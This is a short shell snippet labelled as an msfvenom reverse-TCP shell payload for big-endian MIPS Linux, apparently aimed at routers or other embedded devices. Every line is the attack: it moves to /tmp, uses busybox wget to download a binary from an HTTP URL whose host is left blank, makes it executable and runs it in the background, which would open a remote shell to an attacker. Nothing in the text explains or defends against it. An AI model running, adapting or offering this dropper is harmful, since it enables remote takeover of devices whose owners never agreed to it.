# (msfvenom) linux/mipsbe/shell/reverse_tcp
cd /tmp/
busybox wget -O reverse http:///reverse
busybox chmod +x reverse
./reverse &
